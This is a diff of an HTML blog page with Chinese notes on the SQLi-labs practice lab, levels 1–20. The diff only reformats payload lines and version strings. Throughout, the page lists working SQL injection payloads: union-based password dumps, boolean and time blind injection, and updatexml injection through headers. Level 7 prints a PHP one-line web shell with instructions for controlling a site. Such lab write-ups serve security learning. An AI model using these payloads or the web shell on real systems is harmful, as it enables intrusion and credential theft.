@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1623257647166">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1623258053440">
 <link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
 
 
@@ -34,7 +34,7 @@ mysql查询语句
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://z0ekball.github.io">
-        <img src="https://z0ekball.github.io/images/avatar.png?v=1623257647166" class="site-logo">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1623258053440" class="site-logo">
         <h1 class="site-title">z0ekball</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -115,8 +115,7 @@ echo &quot;&lt;br&gt;&quot;;
 查字段：select username,password from security.users;
 </code></pre>
 <h1 id="less-1">less-1</h1>
-<pre><code class="language-sql">注入漏洞：id=1'--+
-</code></pre>
+<p>注入漏洞：id=1'--+</p>
 <h3 id="知识点补充">知识点补充：</h3>
 <pre><code class="language-sql">* order by //判断多少个注入点
 * union select  1,2,3  //查看那些数据可以回显(id=-1)
@@ -150,17 +149,13 @@ id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from secur
 </code></pre>
 <figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
 <h1 id="less-2">less-2</h1>
-<pre><code>注入漏洞：id=1--+,不需要'
-</code></pre>
+<p>注入漏洞：id=1--+,不需要'</p>
 <h1 id="less-3">less-3</h1>
-<pre><code>注入漏洞：id=1')--+
-</code></pre>
+<p>注入漏洞：id=1')--+</p>
 <h1 id="less-4">less-4</h1>
-<pre><code>注入漏洞：id=1”)--+
-</code></pre>
+<p>注入漏洞：id=1”)--+</p>
 <h1 id="less-5布尔型盲注">less-5（布尔型盲注）</h1>
-<pre><code>注入漏洞：1'--+,布尔型盲注
-</code></pre>
+<p>注入漏洞：1'--+,布尔型盲注</p>
 <h3 id="知识点补充-2">知识点补充</h3>
 <pre><code class="language-sql">1. left(a,b) 从左侧截取a的前b位,正确返回1,错则返回0 ——burpsuit爆破
 2. regexp 正则表达式
@@ -189,11 +184,9 @@ ascii(substr((select database()),1,1)2分法获得字符
 <p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
 <img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
 <h1 id="less-6">less-6</h1>
-<pre><code>注入漏洞：id=1”--+,布尔型盲注
-</code></pre>
+<p>注入漏洞：id=1”--+,布尔型盲注</p>
 <h1 id="less-7一句话木马">less-7（一句话木马）</h1>
-<pre><code>注入漏洞：id=1'))--+,布尔型盲注
-</code></pre>
+<p>注入漏洞：id=1'))--+,布尔型盲注</p>
 <h3 id="知识点补充-3">知识点补充：</h3>
 <pre><code class="language-sql">1.一句话木马： &lt;?php @eval($_POST['attack']);?&gt;
 【基本原理】利用文件上传漏洞,往目标网站中上传一句话木马,然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误,也不报错。eval()函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。
@@ -210,20 +203,16 @@ ascii(substr((select database()),1,1)2分法获得字符
 <p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
 <img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
 <h1 id="less-8">less-8</h1>
-<pre><code>注入漏洞：id=1'--+,布尔盲注
-</code></pre>
+<p>注入漏洞：id=1'--+,布尔盲注</p>
 <h1 id="less-9时间盲注">less-9（时间盲注）</h1>
-<pre><code>注入漏洞：id=1' --+,时间盲注
-</code></pre>
+<p>注入漏洞：id=1' --+,时间盲注</p>
 <h3 id="实例">实例</h3>
 <pre><code class="language-sql">id=1' and sleep(5)--+ //延迟5秒表示注入成功
 </code></pre>
 <h1 id="less-10">less-10</h1>
-<pre><code>注入漏洞：id=1”--+,时间盲注
-</code></pre>
+<p>注入漏洞：id=1”--+,时间盲注</p>
 <h1 id="less-11">less-11</h1>
-<pre><code class="language-sql">注入漏洞：uname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit
-</code></pre>
+<p>注入漏洞：uname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
 <h3 id="实例-和get相同">实例 (和get相同)</h3>
 <pre><code class="language-sql">//查多少个注入点
 uname=n' order by 2 #&amp;passwd=admin&amp;submit=Submit
@@ -245,34 +234,28 @@ uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from sec
 </code></pre>
 <figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
 <h1 id="less-12">less-12</h1>
-<pre><code class="language-sql">注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit
-</code></pre>
+<p>注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
 <h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
-<pre><code class="language-sql">注入漏洞：uname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit
-布尔型盲注
-</code></pre>
+<p>注入漏洞：uname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit<br>
+布尔型盲注</p>
 <h3 id="实例-2">实例</h3>
 <pre><code class="language-sql">burp suite爆破：
 uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
 </code></pre>
 <figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
 <h1 id="less-14">less-14</h1>
-<pre><code class="language-sql">注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit
-布尔型盲注
-</code></pre>
+<p>注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
+布尔型盲注</p>
 <h1 id="less-15">less-15</h1>
-<pre><code class="language-sql">注入漏洞：uname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit 
-注入点在passwd,其他一样
-布尔型盲注
-</code></pre>
-<p>#less-16</p>
-<pre><code class="language-sql">注入漏洞：uname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit 
-布尔型盲注
-</code></pre>
+<p>注入漏洞：uname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit<br>
+注入点在passwd,其他一样<br>
+布尔型盲注</p>
+<h1 id="less-16">less-16</h1>
+<p>注入漏洞：uname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit<br>
+布尔型盲注</p>
 <h1 id="less-17更新漏洞">less-17（更新漏洞）</h1>
-<pre><code class="language-sql">注入漏洞：uname=admin &amp;passwd=dadad' # &amp;submit=Submit
-更新密码存在注入漏洞
-</code></pre>
+<p>注入漏洞：uname=admin &amp;passwd=dadad' # &amp;submit=Submit<br>
+更新密码存在注入漏洞</p>
 <h3 id="知识点补充-4">知识点补充</h3>
 <pre><code>updatexml(XML_document,XPath_string,new_value)
 第一个参数：string格式,xml文件对象名称
@@ -286,24 +269,21 @@ uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &am
 </code></pre>
 <figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
 <h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
-<pre><code>注入漏洞：
-User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1
-//   '闭合
-User-Agent:'or updatexml(1,concat('~',(database())),1), '','')# 
- //另一种闭合
-</code></pre>
+<p>注入漏洞：<br>
+User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
+//   '闭合<br>
+User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
+//另一种闭合</p>
 <h3 id="实例-4">实例</h3>
 <pre><code>//查库
 User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
 </code></pre>
 <figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
 <h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
-<pre><code>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1
-注入点在referer,其他一样
-</code></pre>
+<p>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
+注入点在referer,其他一样</p>
 <h1 id="less-20-cookie漏洞">less-20 (cookie漏洞)</h1>
-<pre><code>注入漏洞：cookie中value值'    #注入
-</code></pre>
+<p>注入漏洞：cookie中value值'    #注入</p>
 
             </div>
             
